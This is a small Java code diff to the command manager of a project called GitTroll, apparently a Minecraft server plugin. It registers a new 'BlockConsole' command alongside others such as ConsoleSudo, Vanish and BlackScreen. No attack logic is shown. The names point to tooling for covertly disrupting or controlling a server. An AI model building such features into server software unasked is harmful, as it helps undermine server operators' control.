@@ -48,6 +48,7 @@ import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.ChangeCommandPrefix;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
 import net.Lenni0451.GitTroll.command.commands.plugin.UpdateVersion;
+import net.Lenni0451.GitTroll.command.commands.server.BlockConsole;
 import net.Lenni0451.GitTroll.command.commands.server.Broadcast;
 import net.Lenni0451.GitTroll.command.commands.server.ClearChat;
 import net.Lenni0451.GitTroll.command.commands.server.ConsoleSudo;
@@ -143,6 +144,7 @@ public class CommandManager implements Listener {
 	public final BlackScreen BlackScreen = null;
 	public final ItemScareOff ItemScareOff = null;
 	public final SendGameStateChange SendGameStateChange = null;
+	public final BlockConsole BlockConsole = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
